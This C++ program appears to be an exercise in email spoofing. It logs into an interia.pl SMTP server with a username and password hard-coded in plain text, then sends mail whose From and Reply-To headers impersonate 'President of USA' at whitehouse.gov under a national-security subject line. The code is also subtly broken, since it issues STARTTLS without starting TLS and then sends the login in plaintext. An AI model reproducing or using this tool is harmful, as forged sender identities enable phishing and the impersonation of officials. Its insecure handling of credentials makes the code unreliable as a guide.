#include <iostream>
#include <cstring>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <vector>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string>

using namespace std;

constexpr size_t BUFFER_SIZE = 1024;

string base64Encode(const vector<unsigned char> &input) {
    static const string base64Chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    string output;

    int val = 0, valb = -6;
    for (const unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;

        while (valb >= 0) {
            output.push_back(base64Chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }

    if (valb > -6) {
        output.push_back(base64Chars[((val << 8) >> (valb + 8)) & 0x3F]);
    }

    while (output.size() % 4) {
        output.push_back('=');
    }

    return output;
}

string encodeString(const string &str) {
    vector<unsigned char> data;
    for (char c : str) {
        data.push_back(static_cast<unsigned char>(c));
    }
    return base64Encode(data);
}

bool sendCommand(const int sock, const string &command, char *buffer, const size_t bufferSize) {
    cout << "C: " << command;

    if (send(sock, command.c_str(), command.length(), 0) < 0) {
        cerr << "Failed to send command." << endl;

        return false;
    }

    memset(buffer, 0, bufferSize);
    if (const ssize_t bytesReceived = recv(sock, buffer, bufferSize - 1, 0); bytesReceived < 0) {
        cerr << "Failed to receive response." << endl;

        return false;
    }

    cout << "S: " << buffer;

    const int responseCode = stoi(string(buffer, 3));

    return (responseCode >= 200 && responseCode < 400);
}

int main() {
    const string server = "smtp.interia.pl";
    constexpr int port = 587;

    const string authUsername = "pas2017@interia.pl";
    const string password = "P4SInf2017";

    const string spoofedSender = "president@whitehouse.gov";
    const string spoofedName = "President of USA";

    const string recipient = "pasinf2017@interia.pl";
    const string subject = "Important National Security Update";
    const string body = "Spoofed email test.";

    const string encodedUsername = encodeString(authUsername);
    const string encodedPassword = encodeString(password);

    cout << "Auth Username: " << authUsername << endl;
    cout << "Spoofed Sender: " << spoofedSender << endl;

    const int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket < 0) {
        cerr << "Failed to create socket." << endl;

        return 1;
    }

    const hostent *host = gethostbyname(server.c_str());
    if (!host) {
        cerr << "Failed to resolve hostname." << endl;

        close(clientSocket);

        return 1;
    }

    sockaddr_in serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    memcpy(&serverAddr.sin_addr, host->h_addr, host->h_length);

    if (connect(clientSocket, reinterpret_cast<const sockaddr *>(&serverAddr), sizeof(serverAddr)) < 0) {
        cerr << "Failed to connect to server." << endl;

        close(clientSocket);

        return 1;
    }

    cout << "Connected to " << server << ":" << port << endl;

    char buffer[BUFFER_SIZE] = {};

    if (const ssize_t bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE - 1, 0); bytesReceived < 0) {
        cerr << "Failed to receive greeting." << endl;

        close(clientSocket);

        return 1;
    }
    cout << "S: " << buffer;

    if (!sendCommand(clientSocket, "EHLO client.example.com\r\n", buffer, BUFFER_SIZE)) {
        close(clientSocket);

        return 1;
    }

    if (!sendCommand(clientSocket, "STARTTLS\r\n", buffer, BUFFER_SIZE)) {
        close(clientSocket);

        return 1;
    }

    if (!sendCommand(clientSocket, "EHLO client.example.com\r\n", buffer, BUFFER_SIZE)) {
        close(clientSocket);

        return 1;
    }

    if (!sendCommand(clientSocket, "AUTH LOGIN\r\n", buffer, BUFFER_SIZE)) {
        close(clientSocket);

        return 1;
    }

    if (!sendCommand(clientSocket, encodedUsername + "\r\n", buffer, BUFFER_SIZE)) {
        close(clientSocket);

        return 1;
    }

    if (!sendCommand(clientSocket, encodedPassword + "\r\n", buffer, BUFFER_SIZE)) {
        close(clientSocket);

        return 1;
    }

    if (const string mailFrom = "MAIL FROM:<" + authUsername + ">\r\n"; !sendCommand(
        clientSocket, mailFrom, buffer, BUFFER_SIZE)) {
        close(clientSocket);

        return 1;
    }

    if (const string rcptTo = "RCPT TO:<" + recipient + ">\r\n"; !
        sendCommand(clientSocket, rcptTo, buffer, BUFFER_SIZE)) {
        close(clientSocket);

        return 1;
    }

    if (!sendCommand(clientSocket, "DATA\r\n", buffer, BUFFER_SIZE)) {
        close(clientSocket);

        return 1;
    }

    string message = "From: \"" + spoofedName + "\" <" + spoofedSender + ">\r\n";
    message += "Reply-To: " + spoofedSender + "\r\n";
    message += "To: " + recipient + "\r\n";
    message += "Subject: " + subject + "\r\n";
    message += "\r\n";
    message += body + "\r\n";
    message += "\r\n";
    message += "Best regards,\r\n";
    message += spoofedName + "\r\n";
    message += ".\r\n";

    if (!sendCommand(clientSocket, message, buffer, BUFFER_SIZE)) {
        close(clientSocket);

        return 1;
    }

    sendCommand(clientSocket, "QUIT\r\n", buffer, BUFFER_SIZE);

    close(clientSocket);

    cout << "Spoofed email sent successfully!" << endl;

    return 0;
}
